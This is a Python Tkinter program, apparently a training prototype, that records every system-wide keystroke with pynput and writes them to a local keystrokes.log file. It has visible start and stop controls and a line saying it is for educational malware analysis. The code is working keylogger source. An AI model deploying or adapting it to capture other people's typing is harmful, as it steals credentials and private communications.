import tkinter as tk
from tkinter import ttk, messagebox
from pynput import keyboard
import time
import os

# Global variables
listener = None
is_logging = False
log_file = "keystrokes.log"

def on_press(key):
    if not is_logging:
        return False # Stops the listener thread
        
    try:
        with open(log_file, "a") as f:
            # Handle standard alphanumeric keys
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            # Format special keys for readability
            elif key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" [BACKSPACE] ")
            elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                pass # Ignore shift press itself to reduce log noise
            else:
                f.write(f" [{key.name.upper()}] ")
    except Exception as e:
        print(f"File writing error: {e}")

def start_logger():
    global listener, is_logging
    
    is_logging = True
    btn_start.config(state=tk.DISABLED)
    btn_stop.config(state=tk.NORMAL)
    lbl_status.config(text="Intercepting Keystrokes (Active)...", fg="#c0392b")
    
    # Append session header to the log file
    with open(log_file, "a") as f:
        f.write(f"\n\n--- [SESSION STARTED: {time.ctime()}] ---\n")
        
    # Launch the pynput listener in a background thread
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

def stop_logger():
    global listener, is_logging
    
    is_logging = False
    if listener is not None:
        listener.stop()
        
    btn_start.config(state=tk.NORMAL)
    btn_stop.config(state=tk.DISABLED)
    lbl_status.config(text="Logging Suspended", fg="#2980b9")
    
    # Append session footer
    with open(log_file, "a") as f:
        f.write(f"\n--- [SESSION ENDED: {time.ctime()}] ---\n")
        
    log_path = os.path.abspath(log_file)
    messagebox.showinfo("Session Saved", f"Keystroke log saved locally to:\n{log_path}")

# --- Tkinter GUI Layout ---
root = tk.Tk()
root.title("SOC Toolkit - Endpoint Keylogger")
root.geometry("450x280")
root.resizable(False, False)

frame = ttk.Frame(root, padding="20")
frame.pack(fill=tk.BOTH, expand=True)

lbl_title = tk.Label(frame, text="API Hook Keylogger Prototype", font=("Helvetica", 13, "bold"))
lbl_title.pack(anchor="w", pady=(0, 5))

lbl_desc = tk.Label(frame, text="Intercepts and logs system-wide keyboard events using pynput.\nFor educational malware analysis only.", justify=tk.LEFT, font=("Helvetica", 9), fg="#555")
lbl_desc.pack(anchor="w", pady=(0, 25))

# Controls
btn_start = tk.Button(frame, text="Start Recording", command=start_logger, bg="#c0392b", fg="white", font=("Helvetica", 10, "bold"), pady=8)
btn_start.pack(fill=tk.X, pady=(0, 10))

btn_stop = tk.Button(frame, text="Stop & Save Log", command=stop_logger, bg="#2980b9", fg="white", font=("Helvetica", 10, "bold"), pady=8, state=tk.DISABLED)
btn_stop.pack(fill=tk.X, pady=(0, 20))

lbl_status = tk.Label(frame, text="Ready", font=("Consolas", 10, "bold"), fg="#7f8c8d")
lbl_status.pack(anchor="center")

root.mainloop()